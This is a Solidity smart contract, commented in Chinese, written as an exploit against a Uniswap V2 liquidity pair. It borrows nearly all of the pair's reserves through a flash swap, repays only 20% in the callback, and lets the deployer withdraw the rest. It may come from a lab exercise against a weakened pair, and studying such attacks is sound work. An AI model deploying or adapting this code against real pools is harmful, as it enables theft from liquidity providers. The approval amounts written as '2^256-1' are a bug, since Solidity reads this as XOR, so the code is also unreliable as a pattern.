// Solidity版本声明，该合约使用0.8.0版本以上的Solidity
pragma solidity ^0.8.0;

// 导入Uniswap V2配对接口
import {IUniswapV2Pair} from "../contracts/core/interfaces/IUniswapV2Pair.sol";
// 导入ERC20令牌接口
import {IERC20} from "../contracts/core/interfaces/IERC20.sol";

// 创建一个名为ExploitUniswapV2的新合约
contract ExploitUniswapV2{
    //声明Uniswap V2配对接口的实例
    IUniswapV2Pair uniswapV2Pair;
    // 声明用于操作ERC20代币的接口实例，包括WETH和其他令牌
    IERC20 weth;
    IERC20 token;
    // 攻击者的地址
    address public attacker;
    // Uniswap V2配对合约的地址
    address public uniswapV2PairAddress;
    // WETH代币合约地址
    address public wethAddress;
    // 代币合约地址
    address public tokenAddress;

    // 构造函数，传入Uniswap V2配对地址、WETH地址和代币地址
    constructor(address _uniswapV2Pair,address _weth,address _token) {
        // 初始化各个接口和地址
        weth=IERC20(_weth);
        token=IERC20(_token);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        uniswapV2PairAddress=_uniswapV2Pair;
        wethAddress=_weth;
        tokenAddress=_token;
        // 设置攻击者为合约部署者
        attacker = msg.sender;
        // 对攻击者和Uniswap V2配对合约进行代币授权
        weth.approve(attacker,2^256-1);
        token.approve(attacker,2^256-1);
        weth.approve(uniswapV2PairAddress,2^256-1);
        token.approve(uniswapV2PairAddress,2^256-1);
    }

    // 开始执行攻击
    //攻击思路为，直接以闪电贷功能为入口，贷全部，还十分之二即可
    function exploit() public {
        // 仅攻击者可以触发该函数
        require(msg.sender == attacker, "Not an attacker");
        // 获取Uniswap配对的储备
        (uint reserve0,uint reserve1,uint blocktimestamp)=uniswapV2Pair.getReserves();
        // 执行swap操作
        uniswapV2Pair.swap(reserve0-1, reserve1-1, address(this), "attack");
    }

    // Uniswap V2回调函数，交易完成后被调用
    function uniswapV2Call(
        address, /* sender */
        uint amount0,
        uint amount1,
        bytes calldata /* data */
    ) external {
        // 确保调用者为Uniswap V2配对合约
        require(msg.sender == uniswapV2PairAddress);
        // 计算要返回的数量（这里是原数量的20%）
        uint returnAmount0=amount0*2/10;
        uint returnAmount1=amount1*2/10;
        // 检查配对中哪个是WETH
        address token0InPair=uniswapV2Pair.token0();
        if(token0InPair==wethAddress){
            // 如果token0是WETH，则按对应的数量返回WETH和token
            weth.transfer(uniswapV2PairAddress, returnAmount0);
            token.transfer(uniswapV2PairAddress, returnAmount1);
        }
        else{
            // 如果token0不是WETH，则反过来返回token和WETH
            weth.transfer(uniswapV2PairAddress, returnAmount1);
            token.transfer(uniswapV2PairAddress, returnAmount0);
        }
    }
    // 攻击者取回代币
    function withdraw() public{
        // 仅攻击者可以触发该函数
        require(msg.sender==attacker);
        // 将本合约内的所有WETH和token都转移到攻击者地址
        weth.transfer(attacker,weth.balanceOf(address(this)));
        token.transfer(attacker,token.balanceOf(address(this)));
    }
}
